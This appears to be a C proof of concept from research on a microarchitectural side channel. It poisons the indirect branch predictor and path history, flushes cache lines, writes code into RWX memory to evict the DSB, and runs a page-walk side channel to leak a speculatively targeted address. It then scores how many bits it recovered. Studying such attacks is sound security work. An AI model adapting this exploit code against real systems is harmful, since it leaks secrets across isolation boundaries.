#include "leak.h"
#include "mapping.h"
#include "pwsc.h"
#include "util.h"
#include <emmintrin.h>
#include <time.h>

extern void set_phr(int value);
extern void shift_phr();
extern void clear_phr();

volatile int arch_exec = 0;

__attribute__((section(".secret_section"), used, noinline)) void
secret_function(void) {
  volatile int a = 5;
  return;
}

__attribute__((section(".noise_section"), used, noinline)) void
noise_function(void) {
  volatile int a = 5;
  return;
}

__attribute__((section(".signal_section"), used, noinline)) void
signal_function(void) {
  volatile int a = 5;
  return;
}

__attribute__((noinline, section(".victim_section"))) static void
victim_function(void *secret_ptr, uint64_t mask, int phr) {
  clear_phr();
  set_phr(phr);
  _mm_clflush(secret_ptr);
  _mm_mfence();

  if (arch_exec) {
    asm volatile("movq %0, %%rax\n\t"
                 "movq %1, %%rbx\n\t"
                 "andq %%rbx, %%rax\n\t"
                 "call *%%rax\n\t" // Get prediction from IBP
                 :
                 : "r"(secret_ptr), "r"(mask)
                 : "%rax", "%rbx", "%rcx", "%rdx");
  }
}

__attribute__((noinline)) static void spy_function(void *secret_ptr,
                                                   uint64_t mask, int phr) {

  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");
  asm volatile("nop\n\t");

  clear_phr();
  set_phr(phr);

  if (arch_exec) {
    asm volatile("movq %0, %%rax\n\t"
                 "movq %1, %%rbx\n\t"
                 "andq %%rbx, %%rax\n\t"
                 "call *%%rax\n\t" // Get prediction from IBP
                 :
                 : "r"(secret_ptr), "r"(mask)
                 : "%rax", "%rbx", "%rcx", "%rdx");
  }
}

uint64_t setup_trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
  // Get the machine in known state before triggering page walk
  (void)phase;
  int phr_value;
  for (int i = 0; i < 100; ++i) {
    arch_exec = 1; // Bias the CBP
    phr_value = rand() % 2;
    if (phr_value) // Insert value into IBP
      spy_function(signal_function, ~0x7fff000000000000, phr_value);
    else
      spy_function(noise_function, ~0x7fff000000000000, phr_value);
  }

  for (int i = 0; i < 100; ++i) {
    arch_exec = 1; // Bias the CBP
    phr_value = rand() % 2;
    if (phr_value) // Insert value into IBP
      victim_function(signal_function, ~0x7fff000000000000, phr_value);
    else
      victim_function(noise_function, ~0x7fff000000000000, phr_value);
  }

  arch_exec = 0;
  _mm_clflush((void *)&arch_exec);
  //_mm_clflush((void *)signal_function);
  //_mm_clflush((void *)noise_function);
  _mm_mfence();
  spy_function(0x12345678, ~0x7fff000000000000, 1);
  _mm_clflush((void *)&arch_exec);
  //_mm_clflush((void *)signal_function);
  //_mm_clflush((void *)noise_function);
  _mm_mfence();
  spy_function(0x12345678, ~0x7fff000000000000, 1);
  _mm_clflush((void *)&arch_exec);
  //_mm_clflush((void *)signal_function);
  //_mm_clflush((void *)noise_function);
  _mm_mfence();
  spy_function(0x12345678, ~0x7fff000000000000, 1);
  _mm_clflush((void *)&arch_exec);
  //_mm_clflush((void *)signal_function);
  //_mm_clflush((void *)noise_function);
  _mm_mfence();
  spy_function(0x12345678, ~0x7fff000000000000, 1);
  return __trash;
}

uint64_t trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
  // Trigger page walk
  arch_exec = 0; // Changing condition value
  _mm_mfence();
  _mm_clflush((void *)&arch_exec);       // Flushing
  _mm_clflush((void *)&signal_function); // Flushing
  _mm_clflush((void *)&noise_function);  // Flushing
  spy_function(NULL, ~0x7fff000000000000,
               phase); // Calling the gadget
  return __trash;
}

void evict_dsb(void) {
  typedef void (*fill_func)();

#define ITERATIONS 8192
#define INST_SIZE 6 // add rax, imm32

  // Encoding: 48 05 imm32
  // add rax, imm32
#define ADD_RAX_IMM32 "\x48\x05\x01\x00\x00\x00"

  size_t buffer_size = (ITERATIONS * INST_SIZE) + 1;

  void *buffer = mmap(NULL, buffer_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  if (buffer == MAP_FAILED) {
    perror("mmap");
    return;
  }

  unsigned char *ptr = (unsigned char *)buffer;

  for (int i = 0; i < ITERATIONS; i++) {
    memcpy(ptr, ADD_RAX_IMM32, INST_SIZE);
    ptr += INST_SIZE;
  }

  // return
  *ptr = 0xC3;

  // serialize frontend
  asm volatile("cpuid" ::: "rax", "rbx", "rcx", "rdx");

  ((fill_func)buffer)();

  asm volatile("cpuid" ::: "rax", "rbx", "rcx", "rdx");

  munmap(buffer, buffer_size);
}

void filter_function(uint64_t target, uint64_t *noise_filter) {
  noise_filter[VPN4_TO_CACHE_LINE(target)] += 2;
  noise_filter[VPN3_TO_CACHE_LINE(target)] += 2;
  noise_filter[VPN2_TO_CACHE_LINE(target)] += 2;
  noise_filter[VPN1_TO_CACHE_LINE(target)] += 2;
}

int main(void) {
  // pin cpu
  pin_cpu(0);
  srand(time(0));

  evict_dsb();

  // Experiment setup
  fprintf(stderr, "Running simple test\n");
  fprintf(stderr, "Using the PWC order oracle\n");
  fprintf(stderr, "Architectural derefence\n");
  fprintf(stderr, "Fast configurations\n");
  pwsc_init_reset(setup_trigger, NULL, trigger,
                  MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES, 10, 64);

  uint64_t init_noise_filter[64] = {0};

  filter_function((uint64_t)spy_function, init_noise_filter);
  filter_function((uint64_t)clear_phr, init_noise_filter);
  filter_function((uint64_t)set_phr, init_noise_filter);
  filter_function((uint64_t)victim_function, init_noise_filter);
  filter_function((uint64_t)signal_function, init_noise_filter);
  filter_function((uint64_t)noise_function, init_noise_filter);
  // set_noise_filter(init_noise_filter);

  uint64_t val = *(uint64_t *)secret_function;
  printf("Secret function first 8 bytes: 0x%lx\n", val);
  asm volatile("" ::"r"(val) : "memory");

  fprintf(stderr,
          "Target Secret Value: 0x%lx\tTarget's VPNs + PO are %lu %lu %lu %lu "
          "%lu\n",
          (uint64_t)0x12345678, VPN4_TO_CACHE_LINE((uint64_t *)0x12345678),
          VPN3_TO_CACHE_LINE((uint64_t *)0x12345678),
          VPN2_TO_CACHE_LINE((uint64_t *)0x12345678),
          VPN1_TO_CACHE_LINE((uint64_t *)0x12345678),
          PO_TO_CACHE_LINE((uint64_t *)0x12345678));
  fprintf(stderr, "\n\n\n");

  // Run the PWSC
  struct pwsc_ans ans =
      leak_inst_addr((uint64_t)0x12345678, init_noise_filter, 0);

  // Stats
  int correct_bits = bit_accuracy_checker(ans.va.va, (uint64_t)0x12345678);
  fprintf(stderr,
          "\nRecovered Secret Value: 0x%lx\tRecovered VPNs + PO are %lu %lu "
          "%lu %lu %lu\n",
          (uint64_t)ans.va.va, VPN4_TO_CACHE_LINE(ans.va.va),
          VPN3_TO_CACHE_LINE(ans.va.va), VPN2_TO_CACHE_LINE(ans.va.va),
          VPN1_TO_CACHE_LINE(ans.va.va), PO_TO_CACHE_LINE(ans.va.va));
  fprintf(stderr, "Correct bits: %d\tImprovement Over Random: %d\n",
          correct_bits, correct_bits - 32);
}
